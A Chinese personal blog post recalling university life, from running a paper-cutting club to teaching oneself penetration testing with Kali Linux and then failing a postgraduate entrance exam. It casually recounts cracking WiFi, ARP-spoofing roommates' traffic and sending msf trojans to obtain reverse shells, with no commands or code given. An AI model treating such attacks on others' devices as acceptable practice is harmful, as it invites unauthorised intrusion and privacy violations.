大二，学习上的事就暂且不谈了，都一样，周一周五上课，周六周日放假。不过不同的人大二的生活就开始不一样了。要是说很多人在大一的时候都差不多，一起参加了学生会，社团什么的，到了大二以后，换届的换届，退会的退会，有幸的是，我当上了剪纸协会的副会长，一般一个社会会有4个负责人，1个会长，两个副会长，还有一个理事长。反正都是管事的，每次社团需要举办什么活动，我们几个负责人都要讨论一下活动的举办等等一系列问题，话说，举办活动还是挺有意思的，不过举办活动前后事情也是挺多的。需要外联部去拉赞助，需要组织部写策划案，需要剪纸部和纸艺创作部出作品展览，协调活动现场人员情况等等。就这样，大二我除了每天上课以外，其余的时光都是在协会中度过了，不过我喜欢去图书馆借点书在协会里面看书，一个人安静的看书，还有空调，也是一种享受！皮卡皮卡^v^ 。</p><p>​    在一次偶然的机遇中，我碰到了学校计算机协会的会长，在于他交流的过程中，他和我讲了一些有关黑客的东西，其中就涉及到了各种技术，什么<code>ip</code>定位（小皮毛），渗透测试、<code>kali Linux</code>等，当时的我是第一次接触到渗透测试这个词，也没有听过<code>kali Linux</code>，只知道有软件测试和<code>Linux</code>系统这么一回事。当我从百度中搜索了有关这些词的信息后，开启了我新世界的大门。为了学习渗透，我在虚拟机中装上了<code>kali Linux</code>，这个过程在我摸索的过程了还是碰到了不少坑的，这里就不说了，装上<code>kali Linux</code>以后，第一个想法就是，我该怎么用，怎么去和电影里面的一样去黑别人的电脑？等等，于是在网上搜索了一些相关的资料和视频，开始学习<code>kali Linux</code>，其中，我研究最多的模块就是内网了，其实实际上就是局域网环境内的攻击，这些我是先拿我宿舍的室友和路由器开的刀，先是研究如何破解<code>WiFi</code>密码，然后破击成功后使用<code>nmap</code>扫描内网存活主机，使用<code>arp</code>欺骗局域网的主机，窃取局域网中用户的数据流量等等（这些其实不懂，就是跟着视频操作一遍，照葫芦画瓢，不懂原理），再去使用<code>nessus</code>扫描主机存在的漏洞，最后利用漏洞攻击系统等等（未成功过。:( ），在无线网破解这部分我曾经还在<code>freebuf</code>上发表一篇文章——如何使用<code>Airgeddon</code>找回<code>WiFi</code>密码 ，这篇文章从技术研究，文章的撰写发布花了我好几天的时间，在写文章的那天弄到3点在写完成，不过最后发表了，很开心。大二就说这么多吧，其他的大三再说。</p><p>#0x03 大三</p><p>​    时间很快，我到了大三，大三上学期不知道怎么回事，课少的可怜，所以我就有更多的时间来研究渗透测试的东西了，这段时间我研究了<code>msf</code>中的木马，具体技术也不是很懂，就是利用命令来生成木马，然后将木马发送给受害者，只要受害者点击了以后，我这边就可以反弹回来一个会话，俗称<code>shell</code>，在这里，我可以查看该用户主机中的所有信息（管理员权限），当初就是将这个给我的一个室友演示的，成功让他上船。然后两个人一起研究渗透测试，免杀，<code>Android</code>马等等，只是当初思维比较局限，不知道<code>web</code>层面的渗透，只知道有日战这么一说，但是具体的也不知道怎么日。。。。</p><p>​    大三下学期的课与上学期的课形成了鲜明的对比，基本上天天满课，有的时候晚上还要上课，这，让我在渗透测试方面的研究方面的研究时间大大减少，而且我在大三还萌生了考研的想法，所以，学习任务繁重啊。╮(╯▽╰)╭，不过幸运的是，我在大三过了六级，低分飘过，过了三级网络技术，还拿到了国家励志，也算是我的幸运之年了。皮卡皮卡(<em>^__^</em>) </p><p>#0x04 大四</p><p>​    考研，考研失败，经历就不分享了，免得误导小朋友。不过给出建议就是坚持，很多人在考研的后期都奔溃了，时间不够用，没有复习完，考场心态爆（我在考数学的时候心态崩过，然后出去洗把脸换个位置调整过来了），所以，一定要坚持，怎么也得熬到考研结束。说不定，你就成功了。哇咔咔！！！</p>]]></content>
      
      
      <categories>
          
          <category> 其他文章 </category>
          
          <category> 记录生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
